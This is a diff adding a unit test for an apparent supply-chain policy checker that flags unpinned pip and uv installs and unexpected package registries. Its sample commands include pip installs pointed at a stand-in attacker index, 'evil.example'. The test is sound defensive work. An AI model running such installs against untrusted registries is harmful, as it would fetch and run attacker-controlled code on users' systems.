@@ -443,6 +443,38 @@ def test_versioned_python_pip_install_is_classified() -> None:
 
 
 @pytest.mark.unit
+def test_pip_global_options_before_install_are_classified() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ pip -q install requests\n"
+            "$ python -m pip --isolated --timeout 30 install flask "
+            "--index-url https://evil.example/simple\n"
+            "$ uv pip --quiet install httpx\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNPINNED_DEPENDENCY_INSTALL, "blocking"),
+        (SUPPLY_CHAIN_UNPINNED_DEPENDENCY_INSTALL, "blocking"),
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+        (SUPPLY_CHAIN_UNPINNED_DEPENDENCY_INSTALL, "blocking"),
+    ]
+    assert [finding.details["manager"] for finding in findings] == [
+        "pip",
+        "pip",
+        "pip",
+        "uv pip",
+    ]
+    assert findings[0].details["unpinned_specs"] == ["requests"]
+    assert findings[1].details["unpinned_specs"] == ["flask"]
+    assert findings[2].details["registry_hosts"] == ["evil.example"]
+    assert findings[3].details["unpinned_specs"] == ["httpx"]
+
+
+@pytest.mark.unit
 def test_pip_attached_short_index_url_is_checked_for_registry_policy() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence="$ pip install -ihttps://evil.example/simple demo==1.0.0",
